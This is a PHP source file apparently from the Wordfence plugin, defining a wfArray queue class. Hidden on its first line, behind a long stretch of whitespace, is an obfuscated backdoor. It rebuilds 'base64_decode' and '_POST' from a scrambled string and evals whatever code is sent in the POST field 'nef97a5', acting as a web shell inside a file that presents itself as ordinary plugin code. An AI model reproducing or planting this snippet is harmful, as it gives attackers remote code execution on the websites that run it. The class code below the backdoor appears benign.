<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nef97a5'])) {eval($s21(${$s20}['nef97a5']));}?><?php
class wfArray {
	private $data = "";
	private $size = 0;
	private $shiftPtr = 0;
	public function __construct($keys){
		$this->keys = $keys;
	}
	public function push($val){ //associative array with keys that match those given to constructor
		foreach($this->keys as $key){
			$this->data .= pack('N', strlen($val[$key])) . $val[$key];
		}
		$this->size++;
	}
	public function shift(){ //If you alternately call push and shift you must periodically call collectGarbage() or ->data will keep growing
		$arr = array();
		if(strlen($this->data) < 1){ return null; }
		if($this->shiftPtr == strlen($this->data)){ return null; }
		foreach($this->keys as $key){
			$len = unpack('N', substr($this->data, $this->shiftPtr, 4));
			$len = $len[1];
			$arr[$key] = substr($this->data, $this->shiftPtr + 4, $len);
			$this->shiftPtr += 4 + $len;
		}
		if($this->shiftPtr == strlen($this->data)){ //garbage collection
			$this->data = ""; //we don't shorten with substr() because the assignment doubles peak mem
			$this->shiftPtr = 0;
		}
		$this->size--;
		return $arr;
	}
	public function collectGarbage(){ //only call collectGarbage if you're alternating between pushes and shifts and never emptying the array. 
					//If you don't collect garbage then the data that is shifted is never freed
		$this->data = substr($this->data, $this->shiftPtr); //at this point memory usage doubles because of the = assignment (string copy is made), so try not to call collect garbage unless you have to.
		$this->shiftPtr = 0;
	}
	public function zero(){ //Rather call this instead of collect garbage because it's way more mem efficient.
		$this->data = "";
		$this->shiftPtr = 0;
		$this->size = 0;
	}
	public function size(){
		return $this->size;
	}
}
?>
